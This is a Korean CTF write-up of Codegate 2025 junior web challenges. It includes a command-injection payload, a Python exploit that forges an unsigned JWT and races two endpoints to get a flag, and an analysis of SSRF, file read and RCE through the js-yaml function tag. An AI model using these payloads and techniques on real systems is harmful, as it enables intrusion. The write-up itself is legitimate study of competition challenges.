---
title: Codegate 2025 Preliminary Write Up
description: Junior Division, writeup and upsolving for all web challenge
author: goldleo1
date: 2025-03-07 12:00:00 +0800
categories: [ctf]
tags: [ctf, "2025"]
pin: false
---

<!-- 2025-03-31-codegate-preliminary -->

## Review

코드게이트 본선에 처음 가서 너무 기분이 좋다.

작년에는 웹해킹 1솔로 장렬히 전사했는데 작년보다 발전해서 기분이 좋았다.

11등을 했는데 RPO를 못 봐서 XSS를 못 풀었다;;

포너블 1번도 got overwrite라는데 까먹어서 못 풀었다... ㅠ

서버가 닫혀서 기억나는 것만 쓴다.

<br>

PS. 웹 출제자이신 as3617, whguswo, burdock님 감사합니다!

![alt text](/assets/img/2025-03-31 20-02-49.png)
_Ranked 11th place_

![alt text](/assets/img/2025-03-31 20-06-10.png){: width="400" height="542" }
_2 First bloods in Junior Devision_

## Write Up

### Ping Tester

---

> Keyword: **`Command Injection`**
{: .prompt-info }

<br>

```
0.0.0.0;cat flag
```

**Flag : `codegate2025{80fd12690c4d31a8cf3fe2865e3ceb99aca9e6047c6acb2cbb9157e26ec91f4b}`**

<br>

### Token Rush

---

> Keywords: **`Race Condition`**
{: .prompt-info }

{::options parse_block_html="true" /}

<details><summary markdown="span">Source Code</summary>

{: file="index.js" }

```js
const express = require("express");
const cookieParser = require("cookie-parser");
const crypto = require('node:crypto');
const fs = require("fs");
const path = require("path");
const b64Lib = require("base64-arraybuffer");
const flag = "codegate2025{FAKE_FLAG}";
const PrivateKey = `FAKE_PRIVATE_KEY`;
const PublicKey = `63c9b8f6cc06d91f1786aa3399120957f2f4565892a6763a266d54146e6d4af9`;
const tokenDir = path.join(__dirname, "token");
const app = express();
app.use(express.json());
app.use(cookieParser());
app.set("view engine", "ejs");
Object.freeze(Object.prototype);
fs.promises.mkdir(tokenDir, { recursive: true });

let db = {
    admin: {
        uid: "87c869e7295663f2c0251fc31150d0e3",
        pw: crypto.randomBytes(32).toString('hex'),
        name: "administrator"
    }
};

let temporaryFileName = path.join(tokenDir, crypto.randomBytes(32).toString('hex'));

const gen_hash = async () => {
    let data = "";
    for (var i = 0; i < 1234; i++) {
        data += crypto.randomBytes(1234).toString('hex')[0];
    }
    const hash = crypto.createHash('sha256').update(data);
    return hash.digest('hex').slice(0, 32);
};

const gen_JWT = async (alg, userId, key) => {
    const strEncoder = new TextEncoder();
    let headerData = urlsafe(b64Lib.encode(strEncoder.encode(JSON.stringify({ alg: alg, typ: "JWT" }))));
    let payload = urlsafe(b64Lib.encode(strEncoder.encode(JSON.stringify({ uid: userId }))));
    if (alg == "ES256") {
        let baseKey = await crypto.subtle.importKey("pkcs8", b64Lib.decode(key), { name: "ECDSA", namedCurve: "P-256" }, true, ["sign"]);
        let sig = await crypto.subtle.sign({ name: "ECDSA", hash: "SHA-256" }, baseKey, new TextEncoder().encode(`${headerData}.${payload}`));
        return `${headerData}.${payload}.${urlsafe(b64Lib.encode(new Uint8Array(sig)))}`;
    }
};

const read_JWT = async (token) => {
    const decoder = new TextDecoder();
    let payload = token.split(".")[1];
    return JSON.parse(decoder.decode(b64Lib.decode(decodeurlsafe(payload))).replaceAll('\x00', ''));
};

const urlsafe = (base) => base.replace(/\+/g, "-").replace(/\//g, "_").replace(/=+$/, "");
const decodeurlsafe = (dat) => dat.replace(/-/g, "+").replace(/_/g, "/");

app.post('/', () => { });

app.post("/sign_in", async (req, res) => {
    try {
        const { id, pw } = req.body;
        if (!db[id] || db[id]["pw"] !== pw) {
            res.json({ message: "Invalid credentials" });
            return;
        }
        let token = await gen_JWT("ES256", db[id]["uid"], PrivateKey);
        res.cookie("check", token, { maxAge: 100 }).json({ message: "Success" });
    } catch (a) {
        res.json({ message: "Failed" });
    }
});

app.post("/sign_up", async (req, res) => {
    try {
        const { id, data } = req.body;
        if (id.toLowerCase() === "administrator" || db[id]) {
            res.json({ message: "Unallowed key" });
            return;
        }
        db[id] = { ...data, uid: crypto.randomBytes(32).toString('hex') };
        res.json({ message: "Success" });
    } catch (a) {
        res.json({ message: "Failed" });
    }
});

app.post("/2fa", async (req, res) => {
    try {
        const token = req.cookies.check ?? "";
        const data = await read_JWT(token, PublicKey);
        if (db.admin.uid !== data.uid) {
            res.json({ message: "Permission denied" });
            return;
        }
        let rand_data = await gen_hash();
        await fs.promises.writeFile(temporaryFileName, rand_data);
        res.json({ message: "Success" });
    } catch (a) {
        res.json({ message: "Unauthorized" });
    }
});

app.post("/auth", async (req, res) => {
    try {
        const token = req.cookies.check ?? "";
        const data = await read_JWT(token, PublicKey);
        if (db.admin.uid !== data.uid) {
            res.json({ message: "Permission denied" });
            return;
        }
        const { data: input } = req.body;
        const storedData = await fs.promises.readFile(temporaryFileName, "utf-8");
        console.log(storedData, input);
        if (input === storedData) {
            res.json({ flag });
        } else {
            res.json({ message: "Token Error" });
        }
    } catch (a) {
        res.json({ message: "Internal Error" });
    }
});

app.post("/data", (req, res) => {
    res.status(req.body.auth_key ? 200 : 400).send(req.body.auth_key ? 'Success' : 'Failed');
});

app.listen(1234);
```

</details>

{::options parse_block_html="false" /}

<br>

드림핵에서 [jsdoc](https://dreamhack.io/wargame/challenges/1135)라는 유사한 문제를 풀어보아서 상대적으로 쉽게 해결하였다.

소스코드를 확인하면 JWT를 위험하게 사용하고, `fs.promises.readFile`, `fs.promises.writeFile`로 임시 파일에 접근하여서 `rand_data` Race Condition이 발생한다.

1. 하드코딩된 admin uid로 JWT Token을 생성한다.

2. `/2fa`{: .filepath} 에서 `fs.promises.writeFile()`로 `temporaryFileName`을 연다.

3. 동시에 `/auth`{: .filepath}에서 fd가 이미 할당되어 있으므로 `fs.promises.readFile()`의 값은 Null이 된다.

4. `data`를 빈 문자열로 넘겨주면 해결할 수 있다.

{::options parse_block_html="true" /}

<details><summary markdown="span">exploit</summary>

{: file="ex.py" }

```py
import requests as req
import jwt
import threading

url = 'http://15.165.43.224:1234'
# url = 'http://localhost:1234'

token = jwt.encode({'uid': '87c869e7295663f2c0251fc31150d0e3'}, key=None, algorithm='none')

def send_2fa():
    req.post(f'{url}/2fa', cookies={'check': token})

def send_auth():
    global n
    res = req.post(f'{url}/auth', json={'data': ''}, cookies={'check': token})
    flag = res.json().get('flag', False)
    if flag:
        print(flag)
        exit()

threads = []

for i in range(100):
    t1 = threading.Thread(target=send_2fa)
    t2 = threading.Thread(target=send_auth)

    t1.start()
    t2.start()

    t1.join()
    t2.join()
```

</details>

{::options parse_block_html="false" /}

<br>

### Cha's Point

---

> Keywords: **`Logic Bug`**, **`RCE`**
{: .prompt-info }

<br>

** **_스압 주의_** **

어려웠지만 js 모듈 분석력을 늘릴 수 있었다.

막상 풀이는 간단하지만 코드 분석이 오래 걸렸다.

풀이 방법은 3개?정도 있다. 그리고 분석하다가 나온 재밌는 부분도 있어서 한번 소개해본다.

{: file="init.sql" }

```sql
CREATE DATABASE IF NOT EXISTS codegate 
    CHARACTER SET utf8mb4 
    COLLATE utf8mb4_general_ci;
use codegate;

DROP TABLE IF EXISTS `user`;
CREATE TABLE users (
    id INT AUTO_INCREMENT PRIMARY KEY,
    uid VARCHAR(36) NOT NULL,
    username VARCHAR(255) NOT NULL UNIQUE,
    password VARCHAR(255) NOT NULL
);

INSERT INTO users (uid, username, password) VALUES ("00000000-0000-0000-0000-000000000000", "admin", "dcce77b3a8c4a714c76c3c12f8bfb56b431240adc3ec0faf3fd0eead4e7d0cac");
```

아주 정석적인 sql문이다.

문제랑은 관련없지만 편안하다.

그치만 sql은 [이거](https://goldleo1.github.io/posts/mysql-string-bypass/#2-mysql-collation-trick-a--%C3%A3) 때문에 마음에 안든다.

~~참고로 실제 서버 비번도 **codegate**여서 좀 당황스러웠다... (LFI로 읽음)~~

#### Analysis

디버깅 세팅

1. `Dockerfile`{: .filepath}에서 `USER app`을 주석처리한다.
2. `app.js`{: .filepath}에서  `rateLimit`을 주석처리한다. &#8594; 삶의 질 향상

<br>

{::options parse_block_html="true" /}

<details><summary markdown="span">app.js</summary>

{: file="app.js" }

```js
const express = require("express");
const session = require("express-session");
const crypto = require("crypto");
const path = require("path");
const { rateLimit } = require('express-rate-limit')

const { FILTER } = require("./utils/utils");
const { encode } = require("html-entities");

const auth = require("./routes/auth");
const edit = require("./routes/edit");
const view = require("./routes/view");

const app = express();

app.set("view engine", "ejs");
app.set("views", path.join(__dirname, "views"));

app.use(express.static("public"));
app.use("/plugin", express.static("plugin"));
app.use("/dist", express.static("dist"));
app.use(
    "/mermaid",
    express.static(path.join(path.dirname(require.resolve("mermaid")), ".."))
);

app.use(express.json());
app.use(express.urlencoded({ extended: false }));

app.use(
    session({
        secret: crypto.randomBytes(32).toString("hex"),
        resave: false,
        saveUninitialized: true,
    })
);

// const limiter = rateLimit({
//     windowMs:  60 * 1000,
//     max: 30,
//     standardHeaders: 'draft-8',
//     legacyHeaders: false,
// });
// app.use(limiter);

app.use((req, res, next) => {
    if (req.session.userid || req.path.startsWith("/auth/")) return next();
    return res.redirect("/auth/login");
});

app.use((req, res, next) => {
    if (req.method === "POST") {
        for (const key in req.body) {
            if (req.body[key] && typeof req.body[key] !== "string") {
                return res.status(401).send("Invalid Data");
            }
            if (FILTER.exec(req.body[key])) {
                req.body[key] = encode(req.body[key], { mode: "extensive" });
            }
        }
    }
    next();
});

app.use("/auth", auth);
app.use(["/view", "/_assets", "/css/highlight"], view);
app.use(edit);

process.on('uncaughtException', (err) => {
    console.error('Unhandled Exception:', err);
});

process.on('unhandledRejection', (reason, promise) => {
    console.error('Unhandled Rejection at:', promise, 'reason:', reason);
});

const PORT = 3000;
app.listen(PORT, () => {
    console.log(`[+] Start on port ${PORT}`);
});
```


</details>

{::options parse_block_html="false" /}

`uncaughtException`은 도중에 추가되었는데 SSRF를 할 때 서버가 터지는 이슈가 있었다.

`POST` 메소드의 경우에 FILTER에 걸린다면 html entity encoding을 수행한다.

FILTER에는 `\n`만 있고 `\r`은 우회된다.

```js
const FILTER = /\'|`|\.\.|\.\/|#|%|&|\?|<|>|\(|\)|script|onerror|src|\n/i;
```

<br>

{::options parse_block_html="true" /}

<details><summary markdown="span">routes/auth.js</summary>

{: file="routes/auth.js" }

```js
const router = require("express").Router();
const { DB } = require("../utils/db");
const { v4: uuidv4 } = require("uuid");
const { sha256hash } = require("../utils/utils");

router.use((req, res, next) => {
    if (req.session.userid) {
        return res.redirect("/");
    }
    next();
});

router.get("/register", (req, res) => res.render("register"));

router.post("/register", async (req, res) => {
    const { username, password } = req.body;
    if (typeof username !== "string" || typeof password !== "string") {
        return res.sendStatus(400);
    }

    const encodedUsername = btoa(username);
    const hashedPassword = sha256hash(password);
    const conn = new DB();

    try {
        await conn.query(
            "INSERT INTO users (uid, username, password) VALUES (?, ?, ?)",
            [uuidv4(), encodedUsername, hashedPassword]
        );
        res.redirect("/auth/login");
    } catch (err) {
        res.render("register", { error: "Registration Failed" });
    }
});

router.get("/login", (req, res) => res.render("login"));

router.post("/login", async (req, res) => {
    const { username, password } = req.body;
    if (typeof username !== "string" || typeof password !== "string") {
        return res.sendStatus(400);
    }

    const conn = new DB();
    try {
        const result = await conn.query("SELECT * FROM users WHERE username = ?", [btoa(username)]);
        const user = result[0];
        if (user && user.password === sha256hash(password)) {
            req.session.userid = user.uid;
            res.redirect("/");
        } else {
            res.render("login", { error: "Invalid username or password" });
        }
    } catch (err) {
        res.render("login", { error: "Invalid username or password" });
    }
});

router.get("/logout", (req, res) => {
    req.session.destroy(() => res.redirect("/"));
});

module.exports = router;
const router = require("express").Router();
const { DB } = require("../utils/db");
const { v4: uuidv4 } = require("uuid");
const { sha256hash } = require("../utils/utils");

router.use((req, res, next) => {
    if (req.session.userid) {
        return res.redirect("/");
    }
    next();
});

router.get("/register", (req, res) => res.render("register"));

router.post("/register", async (req, res) => {
    const { username, password } = req.body;
    if (typeof username !== "string" || typeof password !== "string") {
        return res.sendStatus(400);
    }

    const encodedUsername = btoa(username);
    const hashedPassword = sha256hash(password);
    const conn = new DB();

    try {
        await conn.query(
            "INSERT INTO users (uid, username, password) VALUES (?, ?, ?)",
            [uuidv4(), encodedUsername, hashedPassword]
        );
        res.redirect("/auth/login");
    } catch (err) {
        res.render("register", { error: "Registration Failed" });
    }
});

router.get("/login", (req, res) => res.render("login"));

router.post("/login", async (req, res) => {
    const { username, password } = req.body;
    if (typeof username !== "string" || typeof password !== "string") {
        return res.sendStatus(400);
    }

    const conn = new DB();
    try {
        const result = await conn.query("SELECT * FROM users WHERE username = ?", [btoa(username)]);
        const user = result[0];
        if (user && user.password === sha256hash(password)) {
            req.session.userid = user.uid;
            res.redirect("/");
        } else {
            res.render("login", { error: "Invalid username or password" });
        }
    } catch (err) {
        res.render("login", { error: "Invalid username or password" });
    }
});

router.get("/logout", (req, res) => {
    req.session.destroy(() => res.redirect("/"));
});

module.exports = router;
```

</details>

{::options parse_block_html="false" /}

`auth.js`는 특별한게 없다.

<br>

{::options parse_block_html="true" /}

<details><summary markdown="span">edit.js</summary>

{: file="edit.js" }

```js
const router = require("express").Router();
const { read_config, set_config, default_template, UPLOAD_DIR } = require("../utils/utils");
const fs = require("fs");
const path = require("path");

router.get("/", (req, res) => res.render("add"));

router.get("/edit", (req, res) => {
    const userDir = path.join(UPLOAD_DIR, req.session.userid);
    if (!fs.existsSync(userDir)) {
        return res.redirect("/");
    }
    const config = read_config(req.session.userid);
    const slidePath = path.join(userDir, "slide", "default.md");
    const data = fs.existsSync(slidePath) ? fs.readFileSync(slidePath, "utf8").toString() : default_template;
    return res.render("edit", { userId: req.session.userid, data, config });
});

router.post("/edit", (req, res) => {
    const userDir = path.join(UPLOAD_DIR, req.session.userid);
    if (!fs.existsSync(userDir)) {
        return res.redirect("/");
    }
    try {
        fs.writeFileSync(path.join(userDir, "slide", "default.md"), req.body.markdown);
    } catch {
        return res.render("edit", { error: "error" });
    }
    return res.redirect("/view/render");
});

router.post("/edit/add/config", (req, res) => {
    const { title, theme, highlightTheme } = req.body;
    if (typeof title !== "string" || typeof theme !== "string" || typeof highlightTheme !== "string") {
        return res.json({ status: "error" });
    }
    return res.json({ status: set_config(req.session.userid, title, theme, highlightTheme) ? "success" : "error" });
});

router.post("/edit/add/theme", async (req, res) => {
    let url;
    try {
        url = new URL(req.body.url);
    } catch {
        return res.json({ status: "error" });
    }

    const url_ = url.origin + url.pathname;
    const config = read_config(req.session.userid);
    if (!config.title) {
        return res.json({ status: "error" });
    }

    if (!url_.startsWith("https://") && !url_.startsWith("http://")) {
        return res.json({ status: "error" });
    }

    const userDir = path.join(UPLOAD_DIR, req.session.userid);
    const themeDir = path.join(userDir, "_" + path.basename(path.normalize(url_)));

    if (!fs.existsSync(themeDir)) fs.mkdirSync(themeDir, { recursive: true });
    try {
        const response = await fetch(url_);
        const themeData = await response.text();
        fs.writeFileSync(path.join(themeDir, "style.css"), themeData);
        set_config(
            req.session.userid,
            config.title,
            req.session.userid + "/style/_" + path.basename(path.normalize(url_)),
            config.highlightTheme
        );
        return res.json({ status: "success" });
    } catch {
        fs.rmdirSync(themeDir, { recursive: true, force: true });
        return res.json({ status: "error" });
    }
});

router.delete("/edit/del/theme", (req, res) => {
    const config = read_config(req.session.userid);
    const delPath = path.join(UPLOAD_DIR, path.dirname(path.dirname(config.theme)), path.basename(config.theme));

    if (config.theme && fs.existsSync(delPath)) {
        fs.rmdirSync(delPath, { recursive: true, force: true });
        set_config(req.session.userid, config.title, "black", config.highlightTheme);
        return res.json({ status: "success" });
    }
    return res.json({ status: "error" });
});

router.post("/edit/add/highlight", async (req, res) => {
    let url;
    try {
        url = new URL(req.body.url);
    } catch {
        return res.json({ status: "error" });
    }

    const url_ = url.origin + url.pathname;
    const config = read_config(req.session.userid);

    if (!config.title) {
        return res.json({ status: "error" });
    }
    if (!url_.startsWith("https://") && !url_.startsWith("http://")) {
        return res.json({ status: "error" });
    }

    const userDir = path.join(UPLOAD_DIR, req.session.userid);
    const highlightDir = path.join(userDir, "_" + path.basename(path.normalize(url_)));

    if (!fs.existsSync(highlightDir)) {
        fs.mkdirSync(highlightDir, { recursive: true });
    }
    try {
        const response = await fetch(url_);
        const themeData = await response.text();
        fs.writeFileSync(path.join(highlightDir, "highlight.css"), themeData);
        set_config(
            req.session.userid,
            config.title,
            config.theme,
            req.session.userid + "/highlight/_" + path.basename(path.normalize(url_))
        );
        return res.json({ status: "success" });
    } catch {
        fs.rmdirSync(highlightDir, { recursive: true, force: true });
        return res.json({ status: "error" });
    }
});

router.delete("/edit/del/highlight", (req, res) => {
    const config = read_config(req.session.userid);
    const delPath = path.join(UPLOAD_DIR, path.dirname(path.dirname(config.highlightTheme)), path.basename(config.highlightTheme));
    console.log(delPath);
    if (config.highlightTheme && fs.existsSync(delPath)) {
        fs.rmdirSync(delPath, { recursive: true, force: true });
        set_config(req.session.userid, config.title, config.theme, "zenburn");
        return res.json({ status: "success" });
    }
    return res.json({ status: "error" });
});

module.exports = router;
```

</details>

{::options parse_block_html="false" /}

`uploads/{uuid}/slide/default.md` : Markdown

`uploads/{uuid}/config/config.md`: 설정파일

```js
router.post("/edit/add/highlight", async (req, res) => {
    ...
    if (!url_.startsWith("https://") && !url_.startsWith("http://")) {
        return res.json({ status: "error" });
    }

    const userDir = path.join(UPLOAD_DIR, req.session.userid);
    const highlightDir = path.join(userDir, "_" + path.basename(path.normalize(url_)));

    if (!fs.existsSync(highlightDir)) {
        fs.mkdirSync(highlightDir, { recursive: true });
    }
    try {
        const response = await fetch(url_); // SSRF !
        ...
    } catch {
        fs.rmdirSync(highlightDir, { recursive: true, force: true });
        return res.json({ status: "error" });
    }
});
```

`req.body.url`의 값을 `URL`로 파싱했을 때 "http(s)://"로 시작하는지만 검증하고, 
`uploads/{uuid}/_{path.basename(url)}/highlight.css`에 저장한다.

1. SSRF가 발생한다.

2. File Upload 가능성 &#8594; 불가능

```js
const { decode } = require("html-entities");

const encode = (text) => {
    try {
        return encodeURI(text.replace(/"/g, ""));
    } catch {
        return text;
    }
};

const read_config = (uuid) => {
    const configPath = path.join(UPLOAD_DIR, uuid, "config", "config.md");
    if (!fs.existsSync(configPath)) {
        return {};
    }
    const data = fs.readFileSync(configPath, "utf8");
    const lines = data.split("\n");
    return {
        title: decode(lines[1].slice(8, -1)),
        theme: decode(lines[2].slice(7)),
        highlightTheme: decode(lines[3].slice(16))
    };
};

const set_config = (uuid, title, theme, highlightTheme) => {
    const userDir = path.join(UPLOAD_DIR, uuid);
    const requiredFolders = ["config", "slide"];
    if (!fs.existsSync(userDir)) {
        fs.mkdirSync(userDir, { recursive: true });
    }
    requiredFolders.forEach((folder) => {
        const folderPath = path.join(userDir, folder);
        if (!fs.existsSync(folderPath)) {
            fs.mkdirSync(folderPath);
        }
    });
    const configPath = path.join(userDir, "config", "config.md");
    try {
        const content = TEMPLATE.replace("{TITLE}", encode(title))
            .replace("{THEME}", encode(theme))
            .replace("{HIGHLIGHT}", encode(highlightTheme));
        fs.writeFileSync(configPath, content);
    } catch {}
    return fs.existsSync(configPath);
};
```

`read_config`에서는 html entity decoding을 하는데 `set_config`에서는 encodeURI를 사용했다.

try {} catch {}로 핸들링하길래 encodeURI에서 발생하는 [URIError: malformed URI sequence](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Errors/Malformed_URI)를 찾았다.

`"\uD800"`같은 괴랄한 값을 사용하면 `URIError`를 발생시킬 수 있다.

<br>

{::options parse_block_html="true" /}

<details><summary markdown="span">routes/view.js</summary>

{: file="routes/view.js" }

```js
console.log("Hello World!");
```

</details>

{::options parse_block_html="false" /}

```js
router.get("/:file", (req, res) => {
    const requestedFile = req.params.file;
    const highlightStylesPath = path.resolve(
        require.resolve("highlight.js"),
        "..",
        "..",
        "styles",
        requestedFile
    );
    ...
    if (fs.existsSync(highlightStylesPath)) {
        return res.sendFile(highlightStylesPath);
    } else if (fs.existsSync(highlightBase16Path)) {
        return res.sendFile(highlightBase16Path);
    } else {
        return res.sendFile(revealThemePath);
    }
});
```

문제에 활용되지는 않지만 `/view/{file}`에서 File Download 취약점이 있다.
file에 url encoding해서 보내면 임의의 파일을 읽을 수 있다.

![alt text](/assets/img/2025-03-31%2022-12-02.png)

```js
router.get("/render/PDF", async (req, res) => {
    const conn = new DB();
    const userId = req.query.uuid;
    const option = req.query.option ? req.query.option : {};
    const outputFileName = !/'|;|&|\|"|\$|\s/.test(req.query.outputFileName) ? req.query.outputFileName : "output.pdf";

    if (req.ip !== '::ffff:127.0.0.1' && req.ip !== '::1' && req.ip !== '127.0.0.1') {
        return res.status(403).send("Not Allowed Ip"); 
    }

    try {
        const result = await conn.query("SELECT * FROM users WHERE username = 'admin'", []);
        if (userId !== result[0].uid) {
            return res.status(403).send("You are not Admin");
        }
    } catch (err) {
        return res.status(500).send("Error");
    }

    ...

    try {
        const rendered = await render(data, option);
        return res.send(rendered);
    } catch (e) {
        console.log(e);
        return res.status(500).send("Error");
    }
});
```

`/view/rander/PDF`에서는 임의의 `option`을 사용하여 `await render()`를 실행한다.

여기서 option을 사용할 수 있다는 것을 추측할 수 있다.

저 ip검사는 우회할 수 없다.

[https://expressjs.com/en/api.html#req.ip](https://expressjs.com/en/api.html#req.ip)


```js
router.get("/render", async (req, res) => {
    try {
        const userId = req.session.userid;
        const configPath = path.join(UPLOAD_DIR, userId, "config", "config.md");

        if (!fs.existsSync(configPath)) {
            return res.redirect("/");
        }

        const slidePath = path.join(UPLOAD_DIR, userId, "slide", "default.md");
        const useTemplate = !fs.existsSync(slidePath);

        const configData = fs.readFileSync(configPath, "utf8").toString();
        let data = configData;
        if (useTemplate) {
            data += default_template;
        } else {
            data += fs.readFileSync(slidePath, "utf8").toString();
        }

        const { render } = await getRevealMd();
        const rendered = await render(data);
        return res.send(rendered);
    } catch (e) {
        console.log(e);
        return res.status(500).send("Error");
    }
});
```

`/render`에서 `config.md`와 `default.md`의 내용을 읽어서 `await render()`에 넣어준다.

이제부터 제대로 모듈을 분석해보자.

```js
let revealmd = null;

async function getRevealMd() {
    if (!revealmd) {
        revealmd = await import("reveal-md/lib/render.js");
    }
    return revealmd;
}
```


{: file="node_modules/reveal-md/lib/render.js" }

```js
/**
 * Renders the given markdown content into HTML.
 * @param {string} fullMarkdown - The contents of the markdown file, including a possible YAML front matter
 * @param {Object} extraOptions - Additional options (mostly used by tests)
 * @returns {string} The rendered HTML compatible with reveal.js
 */
export const render = async (fullMarkdown, extraOptions = {}) => {
  const { yamlOptions, markdown: contentOnlyMarkdown } = parseYamlFrontMatter(fullMarkdown);
  const options = Object.assign(getSlideOptions(yamlOptions), extraOptions);

  const { title } = options;
  const themeUrl = getThemeUrl(options.theme, options.assetsDir, options.base);
  const highlightThemeUrl = getHighlightThemeUrl(options.highlightTheme);
  const scriptPaths = getScriptPaths(options.scripts, options.assetsDir, options.base);
  const cssPaths = getCssPaths(options.css, options.assetsDir, options.base);

  const revealOptions = Object.assign({}, getRevealOptions(options.revealOptions), yamlOptions.revealOptions);

  const slidifyOptions = _.pick(options, Object.keys(slidifyAttributeNames));
  let slidifyAttributes = [];
  for (const [key, value] of Object.entries(slidifyOptions)) {
    const escaped_value = value.replace(/\n/g, '\\n').replace(/\r/g, '\\r');
    slidifyAttributes.push(`${slidifyAttributeNames[key]}="${escaped_value}"`);
  }

  const preprocessorFn = await getPreprocessor(options.preprocessor);
  const processedMarkdown = await preprocessorFn(contentOnlyMarkdown, options);

  const revealOptionsStr = JSON.stringify(revealOptions);
  const mermaidOptionsStr = options.mermaid === false ? undefined : JSON.stringify(options.mermaid);

  const template = await getTemplate(options.template);
  const context = Object.assign(options, {
    title,
    slidifyAttributes: slidifyAttributes.join(' '),
    markdown: processedMarkdown,
    themeUrl,
    highlightThemeUrl,
    scriptPaths,
    cssPaths,
    revealOptionsStr,
    mermaidOptionsStr,
    watch: getWatch()
  });
  const markup = Mustache.render(template, context);

  return markup;
};
```

yaml 파싱한 값이 option으로 들어가는 것을 확인할 수 있다.

약간의 게싱을 사용하면 ① 임의의 옵션을 사용하여 어떤 값을 덮던가 ② yaml함수를 내부 로직이 취약할 수 있다.

`parseYamlFrontMatter`과 `getPreprocessor`을 분석하자.

#### **parseYamlFrontMatter**

{: file="node_modules/reveal-md/lib/util.js" }

```js
import yamlFrontMatter from 'yaml-front-matter';

export const parseYamlFrontMatter = content => {
  const document = yamlFrontMatter.loadFront(content.replace(/^\uFEFF/, ''));
  return {
    yamlOptions: _.omit(document, '__content'),
    markdown: document.__content || content
  };
};
```

이쯤에서 yaml-front-matter를 구글링해보자.

[https://www.npmjs.com/package/yaml-front-matter](https://www.npmjs.com/package/yaml-front-matter)

```yaml
---
name: Derek Worthen
age: 127
match: !!js/regexp /pattern/gim
run: !!js/function function() { }
---
```

```js
var fs = require('fs');
var yamlFront = require('yaml-front-matter');

fs.readFile('./some/file.txt', 'utf8', function(fileContents) {
    console.log(yamlFront.loadFront(fileContents));
});
```

```js
{ 
    name: 'Derek Worthen',
    age: 127,
    match: /pattern/gim,
    run: [Function],
}
```

yaml에서 js 함수를 동적으로 로딩할 수 있다!!

이것만 해도 충분하지만 더 분석해보자. (사실 별로 쓸모 없다.)

{::options parse_block_html="true" /}

<details><summary markdown="span">매우 디테일한 분석</summary>

위의 `loadFront`로 들어가자.

{: file="node_modules/yaml-front-matter/src/index.js" }

```js
function parse(text, options, loadSafe) {
    let contentKeyName = options && typeof options === 'string'
        ? options
        : options && options.contentKeyName 
            ? options.contentKeyName 
            : '__content';

    let passThroughOptions = options && typeof options === 'object'
        ? options
        : undefined;

    let re = /^(-{3}(?:\n|\r)([\w\W]+?)(?:\n|\r)-{3})?([\w\W]*)*/
        , results = re.exec(text)
        , conf = {}
        , yamlOrJson;

    if ((yamlOrJson = results[2])) {
        if (yamlOrJson.charAt(0) === '{') {
            conf = JSON.parse(yamlOrJson);
        } else {
            if(loadSafe) {
                conf = jsYaml.safeLoad(yamlOrJson, passThroughOptions);
            } else {
                conf = jsYaml.load(yamlOrJson, passThroughOptions); 
            }
        }
    }

    conf[contentKeyName] = results[3] || '';

    return conf;
};

export function loadFront (content, options) {
    return parse(content, options, false);
};
```

여기에서 정규식을 `/^(-{3}(?:\n|\r)([\w\W]+?)(?:\n|\r)-{3})?([\w\W]*)*/`으로 사용하므로 `\n` FILTER를 우회하여 `\r`을 사용할 수 있다.

[^footnote]: The footnote source

`jsYaml`이라는 모듈로 한번 더 들어간다.

{: file="node_modules/yaml-front-matter/node_modules/lib/js-yaml/loader.js" }

```js
function load(input, options) {
  var documents = loadDocuments(input, options);

  if (documents.length === 0) {
    /*eslint-disable no-undefined*/
    return undefined;
  } else if (documents.length === 1) {
    return documents[0];
  }
  throw new YAMLException('expected a single document in the stream, but found more');
}
```

`node_modules/yaml-front-matter/node_modules/lib/js-yaml/loader.js`{: .filepath }로 경로가 징그러운데 `js-yaml` 버전이 "3.14.1"이다. (not 최신)

여기에서 `loadDocuments` --> `readDocument` --> `composeNode`로 들어가자.

참고. `state = new State(input, options)` (loadDocuments에 있음)

첫번째 인자인 `state`는 위와 같이 정의된다.

```js
function State(input, options) {
  this.input = input;

  this.filename  = options['filename']  || null;
  this.schema    = options['schema']    || DEFAULT_FULL_SCHEMA;
  this.onWarning = options['onWarning'] || null;
  this.legacy    = options['legacy']    || false;
  this.json      = options['json']      || false;
  this.listener  = options['listener']  || null;

  this.implicitTypes = this.schema.compiledImplicit;
  this.typeMap       = this.schema.compiledTypeMap;

  this.length     = input.length;
  this.position   = 0;
  this.line       = 0;
  this.lineStart  = 0;
  this.lineIndent = 0;

  this.documents = [];

  /*
  this.version;
  this.checkLineBreaks;
  this.tagMap;
  this.anchorMap;
  this.tag;
  this.anchor;
  this.kind;
  this.result;*/

}
```

`state.schema`는 options['schema']가 없다면 `DEFAULT_FULL_SCHEMA`로 세팅된다.

`DEFAULT_FULL_SCHEMA`는 다음과 같다.

{: file="node_modules/yaml-front-matter/node_modules/lib/js-yaml/schema/default_full.js" }

```js
module.exports = Schema.DEFAULT = new Schema({
  include: [
    require('./default_safe')
  ],
  explicit: [
    require('../type/js/undefined'),
    require('../type/js/regexp'),
    require('../type/js/function')
  ]
});
```

Schema로 이름이 똑같은데 이게 뭐냐면 

{: file="node_modules/yaml-front-matter/node_modules/lib/js-yaml/schema.js" }

```js
function Schema(definition) {
  this.include  = definition.include  || [];
  this.implicit = definition.implicit || [];
  this.explicit = definition.explicit || [];

  this.implicit.forEach(function (type) {
    if (type.loadKind && type.loadKind !== 'scalar') {
      throw new YAMLException('There is a non-scalar type in the implicit list of a schema. Implicit resolving of such types is not supported.');
    }
  });

  this.compiledImplicit = compileList(this, 'implicit', []);
  this.compiledExplicit = compileList(this, 'explicit', []);
  this.compiledTypeMap  = compileMap(this.compiledImplicit, this.compiledExplicit);
}
```

이런 함수이다. 아까의 `{ explicit: [...] }` 중에서 `require('../type/js/function')`을 보자. 

It looks very suspicious.

```js
...

function constructJavascriptFunction(data) {
  var source = '(' + data + ')',
      ast    = esprima.parse(source, { range: true }),
      params = [],
      body;

    ...

  return new Function(params, 'return ' + source.slice(body[0], body[1]));
}

...

module.exports = new Type('tag:yaml.org,2002:js/function', {
  kind: 'scalar',
  resolve: resolveJavascriptFunction,
  construct: constructJavascriptFunction,
  predicate: isFunction,
  represent: representJavascriptFunction
});
```

헉!

`new Function(params, 'return ' + source.slice(body[0], body[1]))`에 사용자 입력값을 넣어준다!

**RCE다!!** (호출 시)

참고로 아까의 기억을 되살리면 돌아와서 State 클래스에서 `this.typeMap = this.schema.compiledTypeMap`이다.

compiledTypeMap은 compiledImplicit과 compiledExplicit을 모두 포함하므로 아까의 것을 활용한 RCE가 가능하다.


[+] `composeNode`에서 1325번째 줄에 있는 `readTagProperty(state)`에서 state.tag값을 결정한다.

